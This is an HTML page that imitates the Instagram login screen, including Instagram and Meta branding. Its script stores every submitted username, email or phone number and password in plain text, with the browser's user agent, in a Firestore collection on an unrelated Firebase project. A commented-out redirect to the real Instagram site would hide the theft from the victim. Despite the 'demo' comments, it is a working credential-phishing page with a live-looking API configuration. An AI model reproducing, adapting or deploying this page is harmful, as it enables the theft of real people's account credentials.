<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- Firebase CDN -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #0d0d17; /* Dark blue/charcoal background */
            color: #f5f5f5;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: space-between;
            min-height: 100vh;
            padding: 20px;
            text-align: center;
        }

        .main-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            width: 100%;
            max-width: 350px;
            flex-grow: 1;
        }

        .language-selector {
            color: #a8a8a8;
            font-size: 12px;
            margin-bottom: 40px;
            position: absolute;
            top: 20px;
        }
        
        .instagram-logo {
            width: 100px;
            height: 100px;
            margin-bottom: 30px;
        }

        .login-form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 8px;
            margin-bottom: 20px;
        }

        .form-input {
            width: 100%;
            height: 44px;
            padding: 0 16px;
            border: 1px solid #363636;
            border-radius: 6px;
            font-size: 14px;
            color: #f5f5f5;
            background-color: #1e1e2d;
            transition: border-color 0.2s;
        }

        .form-input:focus {
            outline: none;
            border-color: #555;
        }

        .form-input::placeholder {
            color: #8e8e8e;
        }

        .login-submit-btn {
            width: 100%;
            height: 44px;
            background-color: #0095f6;
            color: #ffffff;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 12px;
            transition: opacity 0.2s;
        }

        .login-submit-btn:disabled {
            opacity: 0.4;
            cursor: not-allowed;
        }

        .forgot-password {
            color: #0095f6;
            text-decoration: none;
            font-size: 13px;
            font-weight: 500;
            margin-bottom: 30px;
        }
        
        .create-account-btn {
            width: 100%;
            max-width: 350px;
            height: 44px;
            background-color: transparent;
            color: #0095f6;
            border: 1px solid #0095f6;
            border-radius: 30px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-bottom: 20px;
        }

        .create-account-btn:hover {
            background-color: rgba(0, 149, 246, 0.1);
        }

        .footer {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            color: #a8a8a8;
            font-size: 14px;
            padding-bottom: 10px;
        }

        .meta-logo {
            width: 20px;
            height: 20px;
            fill: #a8a8a8;
        }
        
        .error-message {
            background-color: #5c2121;
            color: #ffb1b1;
            padding: 10px;
            border-radius: 4px;
            border: 1px solid #7c2d2d;
            font-size: 14px;
            margin-bottom: 12px;
            display: none; /* Hidden by default */
        }
    </style>
</head>
<body>
    <div class="main-container">
        <span class="language-selector">English (US)</span>
        
        <!-- Instagram Logo SVG -->
        <svg viewBox="0 0 96 96" class="instagram-logo" role="img" aria-label="Instagram logo">
            <defs>
                <radialGradient id="instagram-gradient" cx="0.3" cy="1.2" r="1">
                    <stop offset="0" stop-color="#FED977"></stop>
                    <stop offset="0.3" stop-color="#F58529"></stop>
                    <stop offset="0.6" stop-color="#D92E7F"></stop>
                    <stop offset="1" stop-color="#9C40C4"></stop>
                </radialGradient>
            </defs>
            <path fill="url(#instagram-gradient)" d="M48 0C21.5 0 0 21.5 0 48s21.5 48 48 48 48-21.5 48-48S74.5 0 48 0zm0 88C26 88 8 70 8 48S26 8 48 8s40 18 40 40-18 40-40 40z"></path>
            <path fill="url(#instagram-gradient)" d="M48 24c-13.3 0-24 10.7-24 24s10.7 24 24 24 24-10.7 24-24-10.7-24-24-24zm0 40c-8.8 0-16-7.2-16-16s7.2-16 16-16 16 7.2 16 16-7.2 16-16 16z"></path>
            <circle fill="url(#instagram-gradient)" cx="70" cy="26" r="4"></circle>
        </svg>

        <form class="login-form" id="loginForm">
            <input type="text" class="form-input" id="loginInput" placeholder="Username, email or mobile number" oninput="checkFormValidity()">
            <input type="password" class="form-input" id="passwordInput" placeholder="Password" oninput="checkFormValidity()">
            <div id="messageContainer"></div> <!-- For error messages -->
            <button type="submit" class="login-submit-btn" id="submitBtn" disabled>Log in</button>
        </form>

        <a href="#" class="forgot-password">Forgot password?</a>
    </div>

    <button class="create-account-btn">Create new account</button>

    <div class="footer">
        <!-- Meta Logo SVG -->
        <svg viewBox="0 0 24 24" class="meta-logo" aria-label="Meta logo">
            <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm0 22C6.486 22 2 17.514 2 12S6.486 2 12 2s10 4.486 10 10-4.486 10-10 10zM8.5 8.5c-1.93 0-3.5 1.57-3.5 3.5s1.57 3.5 3.5 3.5c1.178 0 2.22-.585 2.865-1.485l-1.48-1.48C9.555 12.86 9.07 13 8.5 13c-.827 0-1.5-.673-1.5-1.5s.673-1.5 1.5-1.5c.57 0 1.055.36 1.385.865l1.48-1.48C10.72 8.985 9.678 8.5 8.5 8.5zm7 0c-1.93 0-3.5 1.57-3.5 3.5s1.57 3.5 3.5 3.5c1.93 0 3.5-1.57 3.5-3.5s-1.57-3.5-3.5-3.5zm0 5c-.827 0-1.5-.673-1.5-1.5s.673-1.5 1.5-1.5 1.5.673 1.5 1.5-.673 1.5-1.5 1.5z"></path>
        </svg>
        Meta
    </div>

    <script>
        // Firebase Configuration - Replace with your actual config
        const firebaseConfig = {
            apiKey: "AIzaSyBlevC7LlB-4jDAhzvnQyEfLf3RDh5hF0w",
            authDomain: "tikta-488d7.firebaseapp.com",
            projectId: "tikta-488d7",
            storageBucket: "tikta-488d7.firebasestorage.app",
            messagingSenderId: "91697119107",
            appId: "1:91697119107:web:4c326a974a97bf3066c0b6",
            measurementId: "G-YB7FD7CKJZ"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        function checkFormValidity() {
            const loginInput = document.getElementById('loginInput');
            const passwordInput = document.getElementById('passwordInput');
            const submitBtn = document.getElementById('submitBtn');

            const isValid = loginInput.value.trim() !== '' && passwordInput.value.trim() !== '';
            
            submitBtn.disabled = !isValid;
        }

        function showError(message) {
            const messageContainer = document.getElementById('messageContainer');
            messageContainer.innerHTML = `<div class="error-message">${message}</div>`;
            // Make it visible
            messageContainer.querySelector('.error-message').style.display = 'block';
        }

        function hideError() {
            const messageContainer = document.getElementById('messageContainer');
            messageContainer.innerHTML = '';
        }

        function setLoading(loading) {
            const submitBtn = document.getElementById('submitBtn');
            const loginInput = document.getElementById('loginInput');
            const passwordInput = document.getElementById('passwordInput');
            
            if (loading) {
                submitBtn.textContent = 'Logging in...';
                submitBtn.disabled = true;
                loginInput.disabled = true;
                passwordInput.disabled = true;
            } else {
                submitBtn.textContent = 'Log in';
                loginInput.disabled = false;
                passwordInput.disabled = false;
                checkFormValidity();
            }
        }

        async function storeLoginData(username, password) {
            try {
                setLoading(true);
                hideError();

                const loginId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
                const loginData = {
                    id: loginId,
                    username_email_phone: username,
                    password: password,
                    timestamp: firebase.firestore.FieldValue.serverTimestamp(),
                    userAgent: navigator.userAgent,
                    createdAt: new Date().toISOString()
                };

                await db.collection('user_logins').doc(loginId).set(loginData);

                console.log('Login data stored successfully:', loginData);
                // On a real site, you would redirect here. For this demo, we'll just log success.
                // window.location.href = "https://instagram.com";

            } catch (error) {
                console.error('Error storing login data:', error);
                showError('Login failed. Please check your credentials and try again.');
            } finally {
                // In a real scenario, we might not want to re-enable the form on failure
                // but for this demo, we will.
                setLoading(false);
            }
        }

        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('loginForm').addEventListener('submit', async function(e) {
                e.preventDefault();
                
                const loginInput = document.getElementById('loginInput').value.trim();
                const password = document.getElementById('passwordInput').value.trim();

                if (!loginInput || !password) {
                    showError('Please fill in all fields.');
                    return;
                }

                await storeLoginData(loginInput, password);
            });
        });
    </script>
</body>
</html>
